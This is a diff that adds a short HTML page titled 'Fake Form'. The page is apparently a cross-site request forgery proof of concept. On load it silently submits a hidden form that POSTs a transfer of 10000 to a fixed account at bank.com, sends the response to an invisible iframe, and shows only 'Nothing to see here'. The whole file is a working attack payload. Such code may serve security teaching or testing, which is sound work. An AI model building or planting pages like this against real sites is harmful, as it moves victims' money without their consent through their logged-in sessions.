@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+  <h1>Nothing to see here</h1>
+    <form action="http://bank.com/transfer" method="POST" name="bank_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="amount" value="10000" />
+      <input type="text" name="to_account" value="2468013579" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
